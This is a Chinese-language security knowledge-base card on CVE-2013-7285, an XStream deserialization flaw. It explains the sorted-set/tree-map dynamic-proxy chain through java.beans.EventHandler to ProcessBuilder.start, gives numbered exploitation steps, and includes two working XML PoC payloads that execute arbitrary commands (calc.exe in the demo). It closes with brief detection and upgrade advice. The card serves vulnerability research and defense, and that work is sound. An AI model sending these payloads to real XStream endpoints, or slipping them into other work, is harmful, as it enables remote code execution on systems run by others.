---
id: web-java-deserialization-xstream-sortedset-dynamicproxy-eventhandler-processbuilder
title: XStream ≤1.4.6（及 1.4.10 未启用安全框架）EventHandler 动态代理链：sorted-set/tree-map 触发 compareTo 反射调用 ProcessBuilder.start
type: scenario
domain: web
path: web/java/deserialization/xstream
technique: xstream-sortedset-dynamicproxy-eventhandler-processbuilder
tags:
- java
- xstream
- deserialization
- cve-2013-7285
- eventhandler
- dynamic-proxy
- processbuilder
- sortedset
- treemap
- rce
cve:
- CVE-2013-7285
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: 1.4.x-1.4.6 及 1.4.10（原文标注）
verification:
  verified_by: verifier-V686
  verified_at: '2026-11-13T15:59:28+08:00'
  notes: 已通读content.md并逐张核对全部12图：图06 DynamicProxyConverter 显示 interfaces=java.lang.Comparable、handler=java.beans.EventHandler(target=ProcessBuilder, command size=3, action=start)；图07 populateTreeMap result.putAll(sortedMap)；图08 TreeMap.put k=$Proxy0.compareTo(t.key)；图09 EventHandler.invokeInternal 的 targetMethod=public java.lang.Process ProcessBuilder.start()，与卡内链一致。CVE编号更正核对：原文第5节标题/类名写作CVE-2013-7258/CVE20137258，但图03官方漏洞表(x-stream.github.io/security.html) Version 1.4.6 (and 1.4.10) 条目为CVE-2013-7285，卡按官方编号记录并通过aliases/正文保留原文编号说明，更正成立。版本：原文显式标注影响1.4.x-1.4.6及1.4.10、测试1.4.5+jdk1.8_66，affected_versions已按原文设置。dedup除自身exact外，top候选29505(0.880)、yso-spring1/2(0.882)、Hessian TreeMap DTraceProbe(0.861)、CC1 LazyMap(0.864)均非同一条链，库内无java.beans.EventHandler/ProcessBuilder链卡片，无重复可删。未实机复现；frontmatter无sources/source_url。
url: /docs/web/java/deserialization/xstream/web-java-deserialization-xstream-sortedset-dynamicproxy-eventhandler-processbuilder/
draft: false
kb_aliases:
- CVE-2013-7285
- CVE-2013-7258（原文编号）
- XStream EventHandler 链
- dynamic-proxy Comparable
- java.beans.EventHandler ProcessBuilder
- sorted-set XStream RCE
- tree-map XStream RCE
---

## 一句话结论

XStream ≤1.4.6（以及未初始化安全框架的 1.4.10）默认可以把 `sorted-set`/`tree-map` 中的 `dynamic-proxy`（实现 `java.lang.Comparable`、handler 为 `java.beans.EventHandler`）还原成对象；`TreeMap.put/putAll` 对键调用 `compareTo` 时进入 `EventHandler.invoke`，按 `action` 反射调用 `ProcessBuilder.start()`，从而无需 JNDI、在任意 JDK 上直接执行任意命令。

## 原理

- **入口在容器类的比较动作**：XStream 的 `TreeSetConverter`/`TreeMapConverter` 在 `populateTreeMap` 里执行 `result.putAll(sortedMap)`；`TreeMap.put` 对每个键调用 `k.compareTo(t.key)`。若键是动态代理且接口为 `Comparable`，就会走到代理 handler。
- **DynamicProxyConverter**：XStream 解析 `<dynamic-proxy>` 时用 `DynamicProxyConverter.unmarshal` 读取 `<interface>` 与 `<handler class=...>`，用 `Proxy.newProxyInstance` 生成代理并把反序列化出的 handler 写入代理。POC 的接口设为 `java.lang.Comparable`，handler 为 `java.beans.EventHandler`。
- **EventHandler 的反射调用**：`EventHandler.invoke` → `invokeInternal` 根据 `target`、`action` 与参数推导目标方法。`target` 为 `java.lang.ProcessBuilder`、`action` 为 `start` 时，最终 `targetMethod` 解析为 `ProcessBuilder.start()`，经 `MethodUtil.invoke` 执行；`ProcessBuilder` 的 `command` 列表由 XML 中的 `<command><string>cmd</string><string>/C</string><string>calc.exe</string></command>` 提供。文章调试截图确认 `targetMethod = public java.lang.Process start()`。
- **为什么成立**：`EventHandler` 是 JDK 自带的公开类，`ProcessBuilder` 也是标准类，二者都不需要额外依赖；XStream 旧版本默认不限制类型，且 `TreeMap` 在反序列化过程中就会触发键比较，不需要目标业务再调用任何方法。
- **CVE 编号说明**：原文把本条编号写作 CVE-2013-7258；XStream 官方安全公告中 `java.beans.EventHandler`/`ProcessBuilder` 远程代码执行对应条目为 CVE-2013-7285（影响 1.4.6 及以下，1.4.10 在未初始化安全框架时受影响）。本卡按官方编号记录。

## 触发条件

- 目标使用 XStream ≤1.4.6（或未初始化安全框架的 1.4.10）且保持默认配置，对外部 XML 调用 `fromXML`。
- 目标 classpath 存在 `java.beans.EventHandler` 与 `java.lang.ProcessBuilder`（标准 JDK 均满足）。
- 进程有权限执行目标命令；不需要出站网络（与 JNDI 型链不同）。
- 未部署针对 `dynamic-proxy`/`EventHandler`/`ProcessBuilder` 的 deny 规则或 WAF 特征拦截。

## 利用步骤

1. 构造 XStream XML：根标签用 `sorted-set`（或 `tree-map`），放入一个 `<dynamic-proxy>` 作为会比较的元素。
2. 代理接口写 `java.lang.Comparable`；handler 指定 `java.beans.EventHandler`，`target` 指定 `java.lang.ProcessBuilder`，`command` 填命令，`action` 填 `start`。
3. 再放入一个可比较元素（如 `<string>foo</string>`），促使 `TreeMap.put` 触发代理的 `compareTo`。
4. 把 XML 提交给目标的 `XStream.fromXML` 入口，进程执行命令（原文用 `calc.exe` 验证）。
5. 失败时检查 XStream 版本/安全框架是否启用、代理接口是否为 Comparable、EventHandler 的 action 是否被白名单拦截。

## PoC

```xml
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>cmd</string>
                    <string>/C</string>
                    <string>calc.exe</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

等价的 `tree-map` 形式（原文第二个 POC，`TreeMapConverter` 分支限制更少）：

```xml
<tree-map>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command><string>cmd</string><string>/C</string><string>calc</string></command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```

原文在 XStream 1.4.5 + JDK 1.8_66 下复现，调用栈为 `TreeMap.put → $Proxy0.compareTo → EventHandler.invoke → MethodUtil.invoke(ProcessBuilder.start)`。

## 变体与关联

- [[web-java-deserialization-xstream-type-permission-bypass]]：目标升级或启用白名单后，属性豁免/层级豁免等特性可继续为动态代理与 EventHandler 构造条件。
- [[web-java-deserialization-xstream-cve-2021-21344-priorityqueue-jaxb-jdbcrowset-jndi]]、[[web-java-deserialization-xstream-cve-2021-21351-rdnentry-xrtreefrag-jdbcrowset-jndi]]：后续版本的比较器/集合触发链，改用 JNDI sink。
- [[web-java-deserialization-xstream-cve-2021-29505-registryimpl-stub-jrmp]]：同产品黑名单绕过，JRMP 二次反序列化。
- 变体：`sorted-set` 与 `tree-map` 两种容器；`action` 可指向其他单参数/无参方法；target 可换其他可执行类；也可把代理放进任何反序列化时会调用 `compareTo`/`equals`/`hashCode` 的容器。

## 检测与防御

- 检测：XML 中出现 `dynamic-proxy`、`java.beans.EventHandler`、`java.lang.ProcessBuilder`、`action=start` 等组合；XStream 版本低于修复版本且未配置白名单；进程异常创建 `cmd`/`calc` 等子进程。
- 防御：升级 XStream ≥1.4.7（并确保 1.4.10 启用安全框架）；按官方建议为 `EventHandler`、`ProcessBuilder`、`Proxy` 注册拒绝 converter；启用最小类型白名单；对反序列化入口做 XML 特征检测与 RASP 拦截。
